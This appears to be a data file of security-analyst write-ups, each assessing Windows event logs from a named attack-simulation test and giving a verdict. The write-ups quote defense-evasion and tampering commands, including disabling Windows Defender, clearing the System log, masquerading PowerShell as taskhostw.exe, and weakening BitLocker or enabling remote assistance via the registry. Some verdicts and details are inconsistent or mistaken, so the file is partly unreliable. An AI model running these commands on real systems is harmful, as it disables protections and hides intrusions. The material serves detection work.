- Validate the intent and authorization behind `admin_test` actions, especially around registry modifications and use of elevated privileges.
- Review any recent user alerts or incidents reported by `admin_test` to correlate with the time of the events.
- Conduct a detailed audit of logon attempts and command executions paired with NTLM authentications.
- Consider reviewing additional logs and monitoring the system for further anomalous behavior or potential indicators of compromise."
Masquerading - powershell.exe running as taskhostw.exe,"After analyzing the provided logs, several observations point towards potentially malicious activities related to process execution and operational behavior that deviate from normal practices:

1. **PowerShell Logs:**
   - The logs show `taskhostw.exe` being executed from a user directory (`C:\Users\admin_test\AppData\Roaming`), but renamed to mimic a legitimate Windows process (`taskhostw.exe`). This is a known technique used in attacks to masquerade malicious scripts or executables as legitimate ones.

2. **Sysmon Logs:**
   - The logs detail the execution of `cmd.exe` with the following command line: `""cmd.exe"" /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y & cmd.exe /K %APPDATA%\taskhostw.exe`. This action copies PowerShell to a non-standard location and renames it to `taskhostw.exe`, which suggests an attempt to bypass security controls that normally monitor the PowerShell path.
   - Subsequent executions of `taskhostw.exe` and the correlation with PowerShell execution further underscore questionable activities. Using an alternate process name and path is a red flag for evading detection.

3. **Security and Privilege Escalation:**
   - Multiple instances of event ID 4672 indicate that standard privileges were assigned to the account ""admin_test,"" suggesting attempts to utilize extensive permissions normally linked to system privilege escalation paths.

4. **Behavior Detection:**
   - The juxtaposition of legitimate processes like `wuauclt.exe` and system-level activities is common during an update process, but the presence of renamed executables and their particular use here indicates attempts to mimic or blend in with routine system processes.

5. **Absence of Command Details:**
   - Many of the logs related to PowerShell and taskhostw.exe show lack of detailed command lines or parameters, raising suspicion of obfuscation attempts.

### Assessment and Risks:
The analyzed logs highlight a blend of techniques likely aiming at obfuscation and stealthy execution of scripts under the guise of legitimate processes. The patterns are reminiscent of activities used in live attacks to maintain persistence while reducing the risk of detection.

### Recommendations and Next Steps:
1. **Resolution: MALICIOUS**
   - Based on the corroborated activities indicating potential masquerading and inappropriate command executions, classify this activity as malicious.

2. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent potential spread or further compromise.
   - Conduct a comprehensive security assessment on the host, including manual threat hunting procedures and scanning for other indicators of compromise.
   - Reset credentials and re-evaluate permissions for key accounts, especially ""admin_test.""

3. **Long-Term Mitigation:**
   - Implement stricter monitoring and filtering of command-line executions, particularly those involving PowerShell and command processors.
   - Review and potentially increase restrictions on user directories from which executables can run or be copied.

### Conclusion:
The manifestations of process impersonation and unauthorized privilege escalation necessitate immediate attention and assert that this event is not benign or merely suspiciously unusual in nature, but inherently malicious."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"**Analysis of Provided Logs**

**Suspicious or Anomalous Behavior Identified:**

1. **Unexpected PowerShell Execution**: There is an instance of PowerShell being executed by the `admin_test` user without clear context on what command or script it is running (EventID: 5, ProcessId: 5716, Image: *C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe*). PowerShell is often used in malware operations to execute scripts and commands, especially in lateral movement or persistence tasks.

2. **Execution of wevtutil and conhost**: There are multiple entries of `wevtutil.exe` and `conhost.exe` appearing consecutively, executed by the user `admin_test`. `wevtutil` is a legitimate tool to manage event logs, but unexpected or repeated usage might indicate log manipulation or clearing, which is suspicious (EventRecordID: 17992, 17993, and others).

3. **Host and Whoami Commands**:
   - *HOSTNAME.EXE* and *whoami.exe* are typically harmless and used to gather basic information, but their appearance following each other may suggest reconnaissance activity (EventID: 1, ProcessId: 3260 - HOSTNAME.EXE, ProcessId: 6984 - whoami.exe).

4. **Suspicious cmd Execution**: A potentially anomalous command is issued via `cmd.exe` to `wuauclt.exe`, targeting a DLL (`calc.dll`) from a temporary directory. This type of execution could involve DLL sideloading or exploitation (EventID: 1, ProcessId: 2512, CommandLine: `""cmd.exe"" /c wuauclt.exe /UpdateDeploymentProvider ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll"" /RunHandlerComServer`).

5. **Uncommon Use of wuauclt.exe**: The `wuauclt.exe` process is logged with suspicious command line arguments targeting temporary folders, which might indicate an attempt to execute unauthorized updates (ProcessId: 6340, Image: *C:\Windows\System32\wuauclt.exe*).

**Conclusion and Recommendation:**

While the logs contain many entries of regular Windows processes and applications running under the SYSTEM or NT AUTHORITY context, which is normal, the combination of PowerShell execution without activity logging, usage of `wevtutil`, suspicious handling of `.dll` files with `wuauclt.exe`, and the other window commands, indicate potentially malicious activity that aligns with common tactics used in cyber intrusions.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Response**: Isolate the affected machine to prevent further potential spread and collect memory dumps for deeper forensic analysis.
- **Investigate User `admin_test`**: Review recent activities, access logs, and permissions associated with `admin_test`.
- **Audit PowerShell Logs**: Enable enhanced logging for PowerShell and review command history to understand actions taken.
- **Check Analytics for `wevtutil` Commands**: Investigate any incidents of log clearing or tampering consistent with `wevtutil` execution.
- **Examine the DLL in Use**: Analyze the `calc.dll` mentioned in the suspicious command for any signs of malicious payloads.

- **Patch and Update**: Ensure the system and associated applications are fully patched, including security baselines.

- **Strengthen Monitoring & Detection Systems**: Enhance EDR capabilities to detect unusual activities involving PowerShell, `wevtutil`, and DLL usage."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"### Analysis of Logs

Upon reviewing the provided event logs, several activities raise red flags and warrant further investigation. Here's a detailed analysis of the activities:

#### Security Logs

- **Event ID 4798 (Attempting to Enumerate Local Accounts) & Event ID 4799 (Enumerating Local Groups)**
  - These events show repeated attempts to enumerate local accounts and groups using `CompatTelRunner.exe`. While this executable is a legitimate Windows process, primarily used for telemetry purposes, its use here to enumerate accounts and groups is not typical behavior.
  - Specifically, accounts like ""Guest,"" ""Administrator,"" ""admin_test,"" and service accounts such as ""sshd"" are enumerated. Such activity could indicate reconnaissance attempts, potentially for lateral movement or privilege escalation.

- **Event ID 4672 (Special Privileges Assigned to New Logon)**
  - The `SYSTEM` account received a large number of elevated privileges, including powerful ones like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and more. This is typically normal for system operations but should be cross-referenced with suspicious activities.

#### Sysmon Logs

- **Process Creation Events (Event ID 1)**
  - `powershell.exe` is launched with a high integrity level by the user `SERVER002\admin_test`. The command line includes a function call potentially indicating scripted or automated actions:
    - `Invoke-ATHRemoteFXvGPUDisablementCommand`.
  - Use of `PowerShell` with possibly arbitrary or obfuscated commands could indicate attempts to obscure activities or initiate unauthorized operations.

- **Numerous `wevtutil.exe` and `conhost.exe` Process Executions (Event ID 5)**
  - These processes were executed by the `admin_test` user. `wevtutil.exe` is used to query and interact with event logs, which could suggest attempts to quietly analyze or clear event logs to cover tracks.

- **Utilities Executions (Event ID 1 and 5) like `whoami.exe`, `hostname.exe`**
  - Though these utilities are commonly known and used for information gathering, their repeated execution could imply credential harvesting or environment reconnaissance activities.

#### Windows PowerShell Logs

- **PowerShell Command (Event ID 600)**
  - The command executed within PowerShell seems to run in a context establishing a `ConsoleHost`. The inclusion of a possibly obfuscated or non-standard invocation, i.e., `{Invoke-ATHRemoteFXvGPUDisablementCommand}`, needs additional scrutiny as it might indicate attempted persistence or configuration change.

### Assessment

The activities observed in the logs are suspicious and possibly indicative of malicious activity:

1. **Unusual Account Enumeration**: Using `CompatTelRunner.exe` for account enumeration is atypical and raises concerns.
2. **PowerShell Execution**: The use of PowerShell with potentially obfuscated commands is a common technique in malicious operations.
3. **System and Security Accounts**: Elevation of privileges and account enumeration suggest possible steps towards privilege escalation or lateral movement.

### Resolution

**SUSPICIOUS**

### Guidance

1. **Conduct Detailed Investigation**: Examine all activities performed by the `admin_test` account and processes executed by it. Also, verify if this account should legitimately have accessed these systems and executed those processes.
   
2. **Forensic Review**: Analyze the scripts and actions initiated by PowerShell, specifically the suspicious commands, to determine their intent and impact.
   
3. **Monitor and Restrict**: Implement monitoring for any further privilege escalations or reconnaissance actions. Consider isolating the machine until a full forensic investigation is performed.

4. **Audit Recent Changes**: Review any changes or anomalies in system security settings and installed software to ensure system stability and integrity. 

Immediate remediation steps should focus on understanding the objective of these actions and preventing potential further compromise."
Create Windows System File with powershell,"Based on the provided Windows event logs, I've conducted a detailed analysis to identify any suspicious activities, indicators of compromise, and possible threats or risks. Here's the assessment:

### Key Findings:

1. **Edge Update Related Activities**:
   - Frequent execution of `MicrosoftEdgeUpdate.exe` and related processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe`. These are legitimate Microsoft Edge update processes and not inherently malicious.
   - The presence of frequent `cmd.exe` and `conhost.exe` processes spawning under legitimate update processes can be characteristic of scheduled Edge browser updates or installations, particularly under System authority.

2. **Command Line and PowerShell Execution**:
   - Execution of `cmd.exe` with a command checking for the existence of `%temp%\data.txt`. This is a benign script that checks for a file's presence, potentially as part of a script or scheduled task to ensure a certain condition before proceeding with further actions.
   - Another `cmd.exe` instance containing a command to echo a string into the same file and a PowerShell script updating the file attributes to 'System'. These activities suggest a scripted process setting up certain configurations or files for internal use; this is not typical of strictly malicious behavior unless further context indicates otherwise.

3. **Sysmon Logs**:
   - The logs indicate high-integrity level executions but correlate with activities related to system updates rather than any direct manipulation by a potentially compromised account.
   - Multiple instances of `wevtutil.exe` are observed, a utility often used for managing and exporting event logs. Considering log management and updates are legitimate operations, this alone doesn’t indicate malicious intent unless aligned with unauthorized access or tampering patterns.

4. **Permissions and Execution Context**:
   - The `NT AUTHORITY\SYSTEM` context indicates that many Edge update processes are running at a high privilege level, which is expected for system-level updates performed by services.
   - Consistent User Identifier `SERVER002\admin_test` noted in several process activities, which suggests actions are performed by a standard user or service account. This behavior aligns with routine processes often scheduled or scripted under administrative accounts.

### Assessment and Resolution:
After analyzing the provided logs:

- **Indicators of Malicious Intent**: There are no direct indicators of compromise such as unusual privilege escalation, unauthorized data exfiltration, registry tampering, or critical system changes that can't be explained by legitimate Edge update activities observed here.
  
- **Activity Context**: The logged activities, including frequent starts and stops of services, command executions, and PowerShell scripts appear related to regular system updates, particularly focusing on Microsoft Edge update processes.
  
Given the analysis of the logs and the context provided:

### Final Resolution: **BENIGN**
The activities within the logs are aligned with legitimate system processes, particularly focusing on scheduled updates and managing conditions necessary for system health checks. If no further context of external threats or alerts coincide with these activities, they should be considered benign maintenance operations by system services. 

**Guidance on Further Actions**: 
Should there be concerns beyond what's evident in these logs, consider corroborating with network traffic analysis, endpoint behavior analytics, and review any external reports related to Edge updates or related CVEs to ensure comprehensive security posture confirmation."
Clear Logs,"Based on the provided Windows event logs, several observations can be made regarding the activities on the Windows host (Server002) under investigation. Below is a detailed analysis of the logs to identify any suspicious or malicious activity:

#### Key Observations:

1. **Legitimate Software Installations and Updates**:
   - Numerous entries in the logs refer to legitimate Microsoft Edge Update processes. Processes such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` are executed under `NT AUTHORITY\SYSTEM`, indicating automated system-level operations for software updating.

2. **System Utilization Commands**:
   - Commands like `hostname.exe` and `whoami.exe` are executed, which are standard Windows utilities for system information and appear to be used by `SERVER002\admin_test`. These actions are generally benign, as checking system and user information is common for administrative troubleshooting.

3. **Use of `wevtutil`**:
   - The command `wevtutil cl System` executed via `cmd.exe` can be used to clear Windows Event Logs. This action is concerning as it suggests potential cover-up operations following unauthorized activity. 

4. **Repeated Process Creations**:
   - The logs show a pattern of process creation and termination involving `conhost.exe`, which is typical as it acts as a wrapper for console-based applications. However, the high frequency in a short timeframe, combined with uses of wevtutil, may indicate scripted automation or obfuscation.

#### Suspicious Observations:

- **Use of `cmd.exe` with `wevtutil cl System`**: 
  - This operation suggests an attempt to clear the system logs. Although not inherently malicious, paired with other evasive actions, it could point to an intention to hide illicit activity.
  
- **Pattern of Process Creation**: 
  - The pattern of rapid process creation, as seen with `wevtutil` and other system utilities, could indicate potential PowerShell or batch script automation, which is often used in both administration and malicious scripting.

#### Assessment:

- While there are indications of legitimate software update operations and routine system checks, the use of the `wevtutil cl System` command to clear the system logs stands out as a notable anomaly. This particular action is commonly associated with attempts to obfuscate malicious behavior by erasing event records.

#### Conclusion:

Given the observations, especially the indication of potential log clearing with `wevtutil cl System`, this leads to categorizing the situation as **SUSPICIOUS**. There is enough evidence to suggest a potential cover-up or unauthorized post-access activity that warrants further investigation. 

#### Recommendations:

- Conduct a detailed review of the `admin_test` user's recent activities and authorizations.
- Investigate and recover deleted Event Log data, if possible, to determine the nature of any other activities during the time in question.
- Harden security configurations and monitor for similar patterns of behavior across other systems.
- Consider deploying additional endpoint threat detection tools to anticipate and mitigate similar future activities.

In summary, the proactive step forward is to investigate further into the rationale behind the use of `wevtutil cl System`, and to monitor the logs thoroughly for any irregularities moving forward."
DLP Evasion via Sensitive Data in VBA Macro over email,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior
Upon analyzing the provided logs, several points of concern emerge:

1. **Repeated Execution of System Utilities:**
   - The Sysmon logs show multiple executions of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`. While these are legitimate Windows utilities, frequent execution in a short span of time by the same user (`SERVER002\\admin_test`) can be indicative of an attacker trying to discover system details.
   
2. **Unhandled Credential Activity:**
   - The Security logs contain multiple entries of Event ID 5379, related to credential access operations, notably involving the `MicrosoftAccount` and `WindowsLive`. The process attempted to perform read operations but failed across several attempts as indicated by return code `3221226021`. This could suggest unsuccessful attempts at harvesting credential information.
   
3. **PowerShell Activity:**
   - The logs reveal PowerShell commands executed by the `SERVER002\\admin_test` account that are sending emails with attachments (`data-cc-macro.xlsm`) using `Send-MailMessage` within PowerShell. This behavior can be linked to exfiltration of data or sending of sensitive information outside the network.

#### Indicators of Malicious Activity or Compromise
1. **PowerShell Email with Attachment:**
   - The use of PowerShell to send emails with attachments is a red flag, especially when file names include ""macro"", often associated with scripts or potentially malicious macros in documents.
   
2. **Execution Context:**
   - The actions were executed with a high integrity level. This implies that the user had elevated privileges, which if misused, could lead to system-wide impacts.

3. **Automation or Scripting Activity:**
   - The pattern of rapid executions of system utilities and PowerShell scripts points towards potential scripting or automated tasks designed to gather information, possibly indicative of a larger attack strategy.

### Assessment

Based on the analysis, there are strong indicators of potentially malicious activity. The behavior observed, particularly the PowerShell script execution that sends files via email, and the repeated failures to access credentials potentially point to an unauthorized attempt to access or exfiltrate sensitive information.

### Resolution

- **MALICIOUS**: The logs indicate behavior consistent with common attack vectors such as credential access attempts and data exfiltration using PowerShell scripts. Immediate investigation and containment are recommended.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further data exfiltration or lateral movement.
   - Perform comprehensive malware scanning and vulnerability assessments on the affected host.

2. **Forensic Investigation:**
   - Conduct a detailed forensic analysis of the system’s processes, network connections, and changes made to critical system files or configurations.
   - Examine other systems for similar patterns of activity to determine if the activity observed is part of a broader campaign.

3. **Review and Mitigation:**
   - Review and reset all access credentials associated with `SERVER002\\admin_test` and any potentially affected accounts.
   - Increase logging and monitoring for similarly anomalous activities across the organization's network.
   - Educate the user on best practices concerning suspicious email attachments and privilege use.

4. **Policy Review:**
   - Ensure strict execution policy settings for PowerShell.
   - Implement alerts for unusual PowerShell activities, and consider deploying additional endpoint protection solutions. 

These actions will help mitigate immediate risk and lay the foundation for improved security posture going forward."
Rundll32 setupapi.dll Execution,"Upon a detailed examination of the provided Sysmon logs, several points of interest and potential indicators of suspicious activity emerge:

### Analysis:

1. **Use of PowerShell**: 
   - The logs indicate an execution of `powershell.exe` by a user with admin privileges on Server002. While PowerShell is a legitimate system administration tool, it is also commonly used by attackers due to its powerful capabilities and ability to execute scripts that can perform a range of malicious actions. 
   - However, without additional context or command-line arguments, this alone is not suspicious but should warrant further review, especially if there are other signs of malicious intent.

2. **Frequent `wevtutil.exe` Invocations**:
   - The frequent invocation of `wevtutil.exe`, which is a command-line utility for managing Windows events, can be suspicious if not expected. Attackers might use `wevtutil.exe` to clear or manipulate event logs to cover their tracks. The repeated use of this utility without a clear administrative purpose could indicate an attempt to hide activity.
   
3. **Command-Line Execution with `cmd.exe` and `rundll32.exe`**:
   - A `cmd.exe` process is observed executing a `rundll32.exe` process with arguments pointing to `setupapi.dll`, likely aiming to install or execute something suspicious via an INF file located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011_DefaultInstall.inf`). This behavior is often associated with attempts to bypass security controls or install malicious software.
   - The hash for the `cmd.exe` process executing this command line is provided and should be checked against known malicious signatures.

4. **Execution of `HOSTNAME.EXE` and `WHOAMI.EXE`**:
   - The execution of utilities like `hostname.exe` and `whoami.exe` indicates gathering information about the system and the currently logged-in user. These tools are frequently used by attackers in the reconnaissance phase of a compromise.
  
5. **Lack of Application, Security, and System logs**:
   - Absence or lack of other log entries (Application, Security, and System logs) could imply log tampering or deletion, though it may also simply be incomplete data provided.

### Assessment:

Based on the identified activities, especially with the repeated use of `wevtutil.exe` and suspicious execution of `cmd.exe` and `rundll32.exe`, there are several signs that suggest potential malicious activity. The combination of system utilities use, particularly for tasks like possible log clearing or executing scripts from unusual paths, raises concerns that need further investigation.

### Resolution:

**SUSPICIOUS** - The logs contain activities that need further investigation to rule out any potential compromise. Specifically, the command-line execution patterns and use of system utilities should be explored further to confirm whether they are part of legitimate administration tasks or indicative of malicious behavior. Follow-up actions might include:
- Reviewing user activity and privileges.
- Investigating the content and origin of the `data.011_DefaultInstall.inf` file.
- Checking process hashes against a threat intelligence database.
- Enabling and reviewing comprehensive logging across all systems involved."
Event Viewer Registry Modification - Redirection URL,"Based on the provided log entries, here is a detailed analysis:

1. **Process Execution and Command-Line Analysis:**
   - We observe a sequence of benign processes like `whoami.exe`, `hostname.exe`, and various instances of `conhost.exe`. These are commonly seen in normal administrative or system maintenance actions.
   - The presence of several `wevtutil.exe` executions in a short time span might suggest log manipulation or querying, which can be a red flag for malicious activity. However, `wevtutil.exe` is also often used by administrative and system processes.
   - Notably, there's an execution of `cmd.exe` with a command line indicating a modification of the Windows Registry: 
     ```shell
     cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\\windows\\system32\\notepad.exe"" /f
     ```
     Modifying the registry in this manner, particularly the Event Viewer settings, can indicate an attempt to obfuscate or redirect logs, potentially malicious.

2. **Privilege Level & User Context:**
   - Many of the processes are executing under `SERVER002\admin_test` with high integrity levels, indicating an administrative context. This could be legitimate if the user is performing system administration tasks, but such privileges could also be indicative of a compromised account being leveraged maliciously.
   - Processes such as `MicrosoftEdgeUpdate.exe` are executing under `NT AUTHORITY\SYSTEM`, which is typical for system-level tasks, particularly updates.

3. **Sequence & Timing of Events:**
   - The logs show a rapid sequence of `wevtutil.exe` executions followed by `cmd.exe`, `reg.exe`, and further command executions, which could imply automated scripting or malicious command sequences.
   - The `MicrosoftEdgeUpdate` processes appear to be part of a legitimate series of updates for Microsoft Edge, as seen from the regular timestamps and parent-child process relationships.

4. **Potential Indicators of Compromise:**
   - The main point of concern is the registry manipulation command. While the use of `cmd.exe` to alter registry settings is not inherently malicious, the context (altering Event Viewer behavior) is suspicious enough to warrant further investigation.

**Assessment and Resolution:**
Given the suspicious registry alteration but without clear destructive or illicit actions, these logs would lean towards further scrutiny:

- **Resolution:** **SUSPICIOUS**

**Recommendation:**
- Conduct a deeper investigation into the account `SERVER002\admin_test` activities to confirm whether the actions were authorized.
- Analyze network traffic or EDR (Endpoint Detection and Response) signals for any anomalies relating to this sequence of events.
- Review policy adherence for administrative actions and the use of command-line interfaces to modify system settings.
- Consider using a SIEM (Security Information and Event Management) to correlate these events with potentially missed indicators or external alerts."
Activate Windows NoFileMenu Group Policy Feature,"Upon reviewing the provided Windows event logs from the CEO's machine, several activities stand out that warrant further assessment to determine if there is a potential security risk. Let's break down the events based on their log source.

### System Logs:
- There are multiple Windows Kernel-General events indicating system time changes by `svchost.exe`. Frequent time changes can be an attempt to evade temporal-based security measures, though no malicious intention is clearly evident.

### Security Logs:
- Multiple successful logon events (ID 4624) and privilege escalation events (ID 4672) are noted for the user `admin_test`.
- The privileges granted include powerful ones such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`, which can indeed be used for malicious activities if in the wrong hands. The source IPs logged in events, `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102` may warrant a check to confirm whether these are from legitimate sources.

### Sysmon Logs:
- There is a sequence of events where multiple utility tools like `wevtutil.exe`, `conhost.exe`, `hostnamr.exe`, `whoami.exe`, and `cmd.exe` are being executed.
- Notably, the command `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFileMenu /t REG_DWORD /d 1 /f` indicates an unauthorized registry modification attempt. Such registry changes could be a sign of a malware operation attempting to modify the system’s configuration to disable exploring the file menu, obstructing user access or visibility.
- The Sysmon logs show multiple instances of `MicrosoftEdgeUpdate.exe` executions under SYSTEM authority. While some are expected for legitimate updates, the frequency and patterns (execution through temp directories) could indicate misuse.

### Application Logs:
- The `edgeupdate` service appears to have stopped multiple times, which can either be routine or suspicious if not expected as part of update processes.

### Evaluation:
- The changes in system time by `svchost.exe`, combined with the extensive access privileges of `admin_test` and the unauthorized registry modification, could indicate potential misuse of system processes or an insider threat.
- The command to add a registry entry silently suggests modification without user awareness. This is a classic technique used by malware to alter system operations.
- The frequent execution of processes with elevated privileges and the presence of registry changes are classic indicators of malicious behavior.

### Guidance:
1. **Network Check**: Verify the source IP addresses and ensure they are legitimate and expected.
2. **User Verification**: Confirm the legitimacy of the `admin_test` account and its activities.
3. **Review Registry Audit Logs**: Check for any other recent unauthorized registry changes or system configuration modifications.
4. **Conduct a Detailed Security Audit**: Review the security policies, privilege allocations, and recent changes associated with critical accounts.
5. **Monitor for Persistence**: Set up tighter monitoring for scheduled tasks, autoruns, and registry run keys.

### Final Resolution:
- **MALICIOUS**: The logs exhibit signs of unauthorized system changes and potential misuse of administrative privileges, indicative of malicious activity. Immediate investigation and action are required to determine the scope and mitigate the threat."
Modify EnableNonTPM Registry entry,"Upon reviewing the provided Windows event logs, here's a detailed analysis of the entries and their implications:

### Analysis Summary:

1. **Sysmon Logs:**
   - Multiple instances of **wevtutil.exe** and **conhost.exe** are executed almost simultaneously by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool provided by Windows for managing event logs, but it can be leveraged by attackers to delete event logs or identify logged events, which could indicate an attempt to cover tracks.
   
   - `conhost.exe` is typically used for hosting console windows. Its repeated and rapid execution without apparent reason might be part of legitimate activity but could also assist in managing console level processes in attacks.
   
   - The execution of **HOSTNAME.EXE** and **whoami.exe** suggests that the user might be gathering information about the machine and logged-in user context. While these actions can be legitimate, when combined with other activities, they might indicate reconnaissance typically conducted by an attacker.

2. **Registry Modification via cmd.exe:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f` shows a direct modification to the Windows registry to enable non-TPM scenarios in BitLocker encryption. This registry edit can weaken security by making encryption dependent on software-based keys instead of more secure TPM hardware-based keys, indicating a potential attempt to tamper with encryption settings.
   
3. **Service Executions:**
   - **svchost.exe** and **sppsvc.exe** are standard Windows services. Their appearance is normal, and they don't inherently indicate malicious activity.

### Assessment:

The sequence of `wevtutil.exe` executions followed by information-gathering commands (`whoami.exe` and `hostname.exe`), and registry modification to adjust encryption policies suggests potentially unauthorized activity on the system. Although Sysmon logs alone cannot confirm intent, the registry modifications related to encryption and the pattern of tool usage do raise concerns.

### Guidance and Resolution:

Considering the activities observed - particularly the registry alteration concerning BitLocker and the pattern of execution of system binaries - the findings point to potentially suspicious behavior. This behavior should be further investigated to rule out unauthorized attempts to weaken security controls or explore the system configuration.

**Resolution: SUSPICIOUS**

### Recommended Steps:
1. **Further Investigation:**
   - Review recent modifications in registry keys related to security settings.
   - Verify with the `admin_test` user if these activities were planned as part of an internal script or a known administrative task.
   - Conduct user interviews or follow up with IT to check for related work or scripts that might have prompted these actions.
   
2. **Monitoring:**
   - Increase monitoring on SYSTEM-related folder accesses and registry key modifications.
   - Implement alerts for excessive use of `wevtutil.exe` and other system-level executable scripts that can impact security logs.

3. **Security Policy Review:**
   - Review policies regarding administrator access and privilege management on critical systems, particularly those used by executives.
   - Review the current encryption policies and ensure BitLocker configurations are per security standards."
Tamper with Windows Defender Command Prompt,"### Analysis of Windows Event Logs

Upon reviewing the provided event logs for Server002, several activities appear notably suspicious and could potentially indicate malicious behavior. Below is a detailed analysis:

#### Suspicious and Anomalous Behavior

1. **Disabling Windows Defender**:
   - **Logs** re: `cmd.exe` execution with a command to stop and disable Windows Defender (`WinDefend`).
   - **Sysmon Logs**: Event shows `cmd.exe` executing the command: `""cmd.exe"" /c sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend`.
   - **Risk**: Disabling system protection is a common tactic used by malware to evade detection and impede remediation efforts.

2. **Potential Privilege Escalation and Unauthorized Access**:
   - **Sysmon Logs**: Multiple `wevtutil.exe` executions by the same user (`SERVER002\admin_test`).
   - **Risk**: `wevtutil.exe` can be used to list or clear Windows event logs, which could indicate an attempt to hide activities.

3. **Frequent Process Spawning**:
   - Instances of processes like `conhost.exe` and `wevtutil.exe` are spawned rapidly and repeatedly.
   - **Risk**: Such behavior could be indicative of script or malware automation attempting to avoid detection or gather system information.

4. **Edge Update Process Activities**:
   - Numerous executions of `MicrosoftEdgeUpdate.exe` and related components.
   - **Risk**: Although this could be part of normal update activities, the volume and rapid successions warrant verification to ensure legitimacy, as similar patterns may be exploited for malware downloads and installations.

#### Outcome Assessment

Given the points above, particularly the disabling of Windows Defender, involvement of system utilities in an unusual manner, and rapid process execution patterns, these logs contain activities that are highly suspicious and potentially indicative of malicious intent. However, to confirm malicious intent definitively, a deeper investigation is required to correlate these logs with network logs, endpoint behavior, and potentially compromised accounts.

### Resolution

**SUSPICIOUS** – The logs indicate activity that is suspicious and warrants further investigation.

### Guidance on How to Proceed

1. **Immediate Actions**:
   - **Isolate the Host**: Consider isolating the host (Server002) from the network to prevent further potential compromise.
   - **Restore Security Settings**: Re-enable and configure Windows Defender to default settings. Run a comprehensive malware scan.

Allow RDP Remote Assistance Feature,"After conducting a detailed analysis of the provided Windows event logs, here's a breakdown of the suspicious or potentially malicious activities present:

### Analysis:

1. **Time Manipulation:**
   - Several entries in the System and Security logs, specifically referencing Microsoft-Windows-Kernel-General and Microsoft-Windows-Security-Auditing, show frequent changes in system time (`EventID 1` and `EventID 4616`). Time manipulation can be a tactic used to evade detection and hinder incident response by altering the timestamps of subsequent system activities, but there is no direct evidence in these logs linking it to malicious behaviors.

2. **Command Execution:**
   - The Sysmon logs indicate the execution of `cmd.exe` with the command line operation conducting a registry modification:
     ```
     ""cmd.exe"" /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
     ```
     This action is suspicious because altering the `Terminal Server` settings to allow remote assistance (`fAllowToGetHelp`) can be indicative of an intent to gain or solidify remote access. This is especially concerning as it can override default security settings.
  
3. **Process Executions:**
   - A pattern of consistent launches of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` is observed. While these utilities are not inherently malicious, repeated and clustered use without clear justification could indicate an attempt to manage or obfuscate event logs, often a sign of malicious activity.

4. **High Integrity Level Contexts:**
   - Notably, processes such as `whoami.exe`, `cmd.exe`, and `reg.exe` have been executed with high integrity levels by `SERVER002\admin_test`. These executions could represent the escalation or use of elevated permissions, potentially aligning with privilege escalation tactics.

5. **Communication & System Tools:**
   - Usage of tools like `hostname.exe` and `whoami.exe` implies reconnaissance activity potentially to gather system or network information.

### Assessment:
Given the above findings, there are notable suspicious behaviors exhibited in the event logs, particularly regarding unauthorized changes to system settings, consistent with enabling remote desktop capabilities, and suspicious process executions. However, there is no definitive proof of malicious intent directly observed within the available logs.

### Threats/Risks Identified:
- Potential unauthorized remote access setup through the registry modification.
- Possible evasion tactics through time manipulation observations.
- Potential misuse of administrative tools (`wevtutil.exe`, `conhost.exe`) to clear logs or inspect system details, which can complement a system compromise strategy.

### Guidance:
1. **Immediate Actions:**
   - Investigate recent system access and modifications to confirm if these changes are authorized and legitimate.
   - Review user activities, particularly for `admin_test`, to ensure all actions correlate with expected and approved tasks.

2. **Further Investigation:**
   - Conduct a deeper forensic examination focusing on registry history and user access logs for detailed context around these changes.
   - Analyze network traffic on `Server002` to detect any anomalous connections or data exfiltration patterns.

3. **Mitigation:**
   - If unauthorized remote access is confirmed, immediately revert the registry change and apply stricter policies for registry modifications.
   - Enhance monitoring of critical systems for similar suspicious patterns and improve alerting mechanisms related to time changes and registry alterations.

### Final Resolution: SUSPICIOUS
Given the indicators found, further investigation is warranted to determine the full extent and nature of the activities. While potentially indicative of a compromise, further corroborative evidence is required before conclusively categorizing the behavior as malicious."
Remove Network Share,"After reviewing the logs, the following observations and potential issues are noted:

### Analysis:

1. **Security Log and System Log**:
   - The TimeChange event (Event ID 4616) is observed, pointing towards a system time modification by the `svchost.exe`. This can sometimes indicate an attempt to manipulate logs or evade detection tools that rely on timestamps. However, this could also be due to legitimate operations or misconfigurations.

2. **Application Log**:
   - The logs show typical service stopping messages from `edgeupdate` and the `Software Protection Platform Service`. These events don't immediately suggest malicious activity without further context. This is standard behavior for application updates or typical system operations.

3. **Sysmon Log**:
   - Multiple process creations involving Windows utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were noted under the `admin_test` account. The frequent use of these utilities, especially `wevtutil.exe` (used for event log querying and clearing), could be suspicious.
   - The `cmd.exe` process with the command line `cmd.exe /c net share \\test\share /delete` is noteworthy. This command can disrupt shared resources if not intended by the user.
